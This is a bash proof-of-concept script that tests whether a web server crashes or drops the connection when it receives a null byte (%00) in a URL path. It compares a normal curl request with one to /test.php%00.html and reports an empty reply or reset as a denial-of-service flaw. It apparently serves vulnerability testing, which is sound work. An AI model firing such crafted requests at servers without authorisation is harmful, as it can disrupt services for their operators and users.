#!/bin/bash

# POC: Null Byte in URL Path - HTTP Request Handling Error
# Demonstrates DoS vulnerability where server crashes or improperly handles null bytes in URL paths

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Testing HTTP Request Handling with Null Byte in URL Path"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Test 1: Normal request (baseline)
echo "[*] Test 1: Normal request (baseline)"
echo "[*] Command: curl -v '${TARGET_URL}/test.php'"
response=$(curl -v "${TARGET_URL}/test.php" 2>&1)
http_code=$(echo "$response" | grep -oP "HTTP/\d\.\d \K\d+" | head -1)
echo "[+] Response code: $http_code"
echo "[+] Connection handled normally"
echo ""

# Test 2: Request with null byte in path (%00)
echo "[*] Test 2: Request with null byte in URL path"
echo "[*] Command: curl -v '${TARGET_URL}/test.php%00.html'"
response=$(curl -v "${TARGET_URL}/test.php%00.html" 2>&1)

# Check if we got an empty reply (connection closed without response)
if echo "$response" | grep -q "Empty reply from server"; then
    echo "[!] VULNERABILITY FOUND: Empty reply from server"
    echo "[!] Server closed connection without returning HTTP response"
    echo "[!] This indicates improper null byte handling"
    exit 0
fi

# Check if we got a connection reset
if echo "$response" | grep -qi "Connection reset by peer\|connection.*refused\|Network is unreachable"; then
    echo "[!] VULNERABILITY FOUND: Connection reset/refused"
    echo "[!] Server closed connection abruptly"
    exit 0
fi

# Check if we got any HTTP response at all
http_code=$(echo "$response" | grep -oP "HTTP/\d\.\d \K\d+" | head -1)
if [ -z "$http_code" ]; then
    echo "[!] VULNERABILITY FOUND: No HTTP response received"
    echo "[!] Server did not return valid HTTP response"
    exit 0
fi

# If we got a 400 Bad Request, that's proper error handling
if [ "$http_code" == "400" ]; then
    echo "[+] Server properly handled null byte with 400 Bad Request"
    echo "[-] No vulnerability - proper error handling in place"
    exit 1
fi

# Check response details
echo "[+] Response code: $http_code"
echo "[*] Full response headers:"
echo "$response" | head -20
exit 0